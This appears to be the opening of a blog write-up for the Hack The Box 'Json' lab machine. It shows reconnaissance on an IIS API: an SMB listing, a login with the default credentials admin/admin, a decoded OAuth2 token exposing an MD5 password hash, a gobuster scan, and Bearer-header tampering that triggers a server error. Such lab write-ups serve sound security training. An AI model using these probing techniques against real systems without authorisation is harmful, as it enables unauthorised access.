<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="[map[name:MindYourPrivacy]]">
<meta name="description" content="Fuzz API and discover Json deserialization vulnerability exploitable with ysoserial. Multiple different privesc are possible to exercise several techniques e.g. zipslip, evilarc, loading FakeDLL, diaghub exploit ..." />
<meta name="keywords" content=", ASP.Net, ysoserial, tcpdump, juicypotato, dnsSpy, evil-winrm, chisel, ftp, tasklist, Diaghub, FakeDll, zipslip, evilarc, VisualStudio" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://0xade1.github.io/devdraft/posts/2020/03/htb-json/" />


    <title>
        
            HTB - Json :: Poney Island  — Welcome to Pwnie Island
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://0xade1.github.io/devdraft/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://0xade1.github.io/devdraft/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://0xade1.github.io/devdraft/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://0xade1.github.io/devdraft/favicon-16x16.png">
    <link rel="manifest" href="https://0xade1.github.io/devdraft/site.webmanifest">
    <link rel="mask-icon" href="https://0xade1.github.io/devdraft/safari-pinned-tab.svg" color="#1b1c1d">
    <link rel="shortcut icon" href="https://0xade1.github.io/devdraft/favicon.ico">
    <meta name="msapplication-TileColor" content="#1b1c1d">
    <meta name="theme-color" content="#1b1c1d">



<meta itemprop="name" content="HTB - Json">
<meta itemprop="description" content="Fuzz API and discover Json deserialization vulnerability exploitable with ysoserial. Multiple different privesc are possible to exercise several techniques e.g. zipslip, evilarc, loading FakeDLL, diaghub exploit ..."><meta itemprop="datePublished" content="2020-03-05T00:54:12+08:00" />
<meta itemprop="dateModified" content="2020-03-05T00:54:12+08:00" />
<meta itemprop="wordCount" content="2847"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
<meta itemprop="keywords" content="ASP.Net,ysoserial,tcpdump,juicypotato,dnsSpy,evil-winrm,chisel,ftp,tasklist,Diaghub,FakeDll,zipslip,evilarc,VisualStudio," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://0xade1.github.io/devdraft"/>

<meta name="twitter:title" content="HTB - Json"/>
<meta name="twitter:description" content="Fuzz API and discover Json deserialization vulnerability exploitable with ysoserial. Multiple different privesc are possible to exercise several techniques e.g. zipslip, evilarc, loading FakeDLL, diaghub exploit ..."/>




    <meta property="og:title" content="HTB - Json" />
<meta property="og:description" content="Fuzz API and discover Json deserialization vulnerability exploitable with ysoserial. Multiple different privesc are possible to exercise several techniques e.g. zipslip, evilarc, loading FakeDLL, diaghub exploit ..." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xade1.github.io/devdraft/posts/2020/03/htb-json/" /><meta property="og:image" content="https://0xade1.github.io/devdraft"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-03-05T00:54:12+08:00" />
<meta property="article:modified_time" content="2020-03-05T00:54:12+08:00" />
<meta property="og:see_also" content="https://0xade1.github.io/devdraft/posts/2021/09/htb-sink/" /><meta property="og:see_also" content="https://0xade1.github.io/devdraft/posts/2021/09/htb-validation/" /><meta property="og:see_also" content="https://0xade1.github.io/devdraft/posts/2021/09/htb-unobtainium/" /><meta property="og:see_also" content="https://0xade1.github.io/devdraft/posts/2021/09/htb-crossfittwo/" /><meta property="og:see_also" content="https://0xade1.github.io/devdraft/posts/2021/09/htb-gobox/" /><meta property="og:see_also" content="https://0xade1.github.io/devdraft/posts/2021/09/htb-knife/" />





    <meta property="article:section" content="htb-windows" />



    <meta property="article:published_time" content="2020-03-05 00:54:12 &#43;0800 &#43;0800" />








    </head>

    
        <body>
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://0xade1.github.io/devdraft/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text"># cd /root/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://0xade1.github.io/devdraft/about/">About</a></li><li><a href="https://0xade1.github.io/devdraft/categories/">Categories</a></li><li><a href="https://0xade1.github.io/devdraft/posts/">Posts</a></li><li><a href="https://0xade1.github.io/devdraft/series/">Series</a></li><li><a href="https://0xade1.github.io/devdraft/tags/">Tags</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-lin      ecap="round" stroke-linejoin="round" class="feather feather-calendar">
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
  <line x1="16" y1="2" x2="16" y2="6"></line>
  <line x1="8" y1="2" x2="8" y2="6"></line>
  <line x1="3" y1="10" x2="21" y2="10"></line>
</svg>

  2020-03-04 


  
 |

      

      

      
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://0xade1.github.io/devdraft/categories/htb-windows/">htb-windows</a></span>
        
        |


      
        |
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://0xade1.github.io/devdraft/series/htb/">htb</a></span>
        
        |


      

    </div>

    <article>
      <h1 class="post-title">
        <a href="https://0xade1.github.io/devdraft/posts/2020/03/htb-json/">HTB - Json</a>
      </h1>

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/asp.net/">ASP.Net</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/ysoserial/">ysoserial</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/tcpdump/">tcpdump</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/juicypotato/">juicypotato</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/dnsspy/">dnsSpy</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/evil-winrm/">evil-winrm</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/chisel/">chisel</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/ftp/">ftp</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/tasklist/">tasklist</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/diaghub/">Diaghub</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/fakedll/">FakeDll</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/zipslip/">zipslip</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/evilarc/">evilarc</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/visualstudio/">VisualStudio</a></span>
        
    </p>


    </div>

      
        <div class="post-excerpt">Fuzz API and discover Json deserialization vulnerability exploitable with ysoserial. Multiple different privesc are possible to exercise several techniques e.g. zipslip, evilarc, loading FakeDLL, diaghub exploit ...</div>
      

      
        <figure class="post-cover">
          <img src="https://www.hackthebox.eu/images/logo-htb.svg" alt="HTB - Json" />

          
        </figure>
      

      <div class="post-content">
        <h1 id="reckon">RECKON</h1>
<ul>
<li>220-FileZilla Server 0.9.60 beta</li>
<li>Microsoft IIS httpd 8.5 =&gt; Windows Server 2012</li>
<li>hostname = JSON</li>
<li>message_signing: disabled (dangerous, but default) or not required</li>
<li>Website with multiple Dead links: javascripts, images &hellip;</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -L <span style="color:#f1fa8c">\\</span>10.10.10.158 -n
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre></td></tr></table>
</div>
</div><p>Connecting Burp-Suite, We can intercept the Login HTTP request, click Action: Send to repeater</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">POST /api/token HTTP/1.1
Host: 10.10.10.158
User-Agent: Mozilla/5.0 <span style="color:#ff79c6">(</span>Macintosh; Intel Mac OS X 10.15; rv:72.0<span style="color:#ff79c6">)</span> Gecko/20100101 Firefox/72.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;<span style="color:#8be9fd;font-style:italic">q</span><span style="color:#ff79c6">=</span>0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;<span style="color:#8be9fd;font-style:italic">charset</span><span style="color:#ff79c6">=</span>utf-8
Content-Length: <span style="color:#bd93f9">39</span>
Origin: http://10.10.10.158
Connection: close
Referer: http://10.10.10.158/login.html

<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;UserName&#34;</span>:<span style="color:#f1fa8c">&#34;admin&#34;</span>,<span style="color:#f1fa8c">&#34;Password&#34;</span>:<span style="color:#f1fa8c">&#34;admin&#34;</span><span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>We have now the answer which contains a cookie</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">HTTP/1.1 <span style="color:#bd93f9">202</span> Accepted
Cache-Control: no-cache
Pragma: no-cache
Expires: -1
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
Set-Cookie: <span style="color:#8be9fd;font-style:italic">OAuth2</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0</span><span style="color:#ff79c6">=</span>; <span style="color:#8be9fd;font-style:italic">expires</span><span style="color:#ff79c6">=</span>Sun, 16-Feb-2020 14:41:24 GMT; <span style="color:#8be9fd;font-style:italic">path</span><span style="color:#ff79c6">=</span>/
X-Powered-By: ASP.NET
Date: Sun, <span style="color:#bd93f9">16</span> Feb <span style="color:#bd93f9">2020</span> 14:39:24 GMT
Connection: close
Content-Length: <span style="color:#bd93f9">0</span>

<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;Id&#34;</span>:1,<span style="color:#f1fa8c">&#34;UserName&#34;</span>:<span style="color:#f1fa8c">&#34;admin&#34;</span>,<span style="color:#f1fa8c">&#34;Password&#34;</span>:<span style="color:#f1fa8c">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span>,<span style="color:#f1fa8c">&#34;Name&#34;</span>:<span style="color:#f1fa8c">&#34;User Admin HTB&#34;</span>,<span style="color:#f1fa8c">&#34;Rol&#34;</span>:<span style="color:#f1fa8c">&#34;Administrator&#34;</span><span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>We are not successful to find additional sweet links</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json$ ../gobuster/gobuster dir --wordlist /opt/dictionaries/common.txt -o gobuster.log -u http://10.10.10.158/
</code></pre></td></tr></table>
</div>
</div><p>No result, but we notice our HTTP POST is sent to /api/token (easier to spot from burp-suite Target tab)</p>
<p>We can try gobuster again with <code>-u http://..../api</code> in an attempt to discover more api links. A good resources is SecList</p>
<blockquote>
<p>git clone <a href="https://github.com/danielmiessler/SecLists.git">https://github.com/danielmiessler/SecLists.git</a></p>
</blockquote>
<p>Let&rsquo;s type /api/Account on Firefox and compare against the capture on Burp we made at login:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">GET</span> /api/Account/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> 10.10.10.158
User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
Accept<span style="color:#ff79c6">:</span> application/json, text/plain, */*
Accept-Language<span style="color:#ff79c6">:</span> en-US,en;q=0.5
Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
Bearer<span style="color:#ff79c6">:</span> eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
Connection<span style="color:#ff79c6">:</span> close
Referer<span style="color:#ff79c6">:</span> http://10.10.10.158/index.html
Cookie<span style="color:#ff79c6">:</span> OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=

HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sun, 16 Feb 2020 14:37:02 GMT
Connection: close
Content-Length: 119

{&#34;Id&#34;:1,&#34;UserName&#34;:&#34;admin&#34;,&#34;Password&#34;:&#34;21232f297a57a5a743894a0e4a801fc3&#34;,&#34;Name&#34;:&#34;User Admin HTB&#34;,&#34;Rol&#34;:&#34;Administrator&#34;}
</code></pre></td></tr></table>
</div>
</div><p>21232f297a57a5a743894a0e4a801fc3 happens to be the md5sum of the password which is admin</p>
<p>The only difference is the absence of the bearer which happens to be part of SWAGGER.
An interesting observation is that the Bearer is identical to the OAuth2 base64 encoded json-string</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">GET</span> /api/Account/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> 10.10.10.158
User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
Accept<span style="color:#ff79c6">:</span> application/json, text/plain, */*
Accept-Language<span style="color:#ff79c6">:</span> en-US,en;q=0.5
Accept-Encoding<span style="color:#ff79c6">:</span> gzip, deflate
Connection<span style="color:#ff79c6">:</span> close
Referer<span style="color:#ff79c6">:</span> http://10.10.10.158/index.html
Cookie<span style="color:#ff79c6">:</span> OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=

HTTP/1.1 401 Unauthorized
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sun, 16 Feb 2020 15:18:37 GMT
Connection: close
Content-Length: 61

{&#34;Message&#34;:&#34;Authorization has been denied for this request.&#34;}
</code></pre></td></tr></table>
</div>
</div><p>On modifying the Bearer within Burp Repeater with <code> Bearer: sec fluctuat nec mergitur</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span> <span style="color:#bd93f9">500</span> Internal Server Error
Cache-Control<span style="color:#ff79c6">:</span> no-cache
Pragma<span style="color:#ff79c6">:</span> no-cache
Content-Type<span style="color:#ff79c6">:</span> application/json; charset=utf-8
Expires<span style="color:#ff79c6">:</span> -1
Server<span style="color:#ff79c6">:</span> Microsoft-IIS/8.5
X-AspNet-Version<span style="color:#ff79c6">:</span> 4.0.30319
X-Powered-By<span style="color:#ff79c6">:</span> ASP.NET
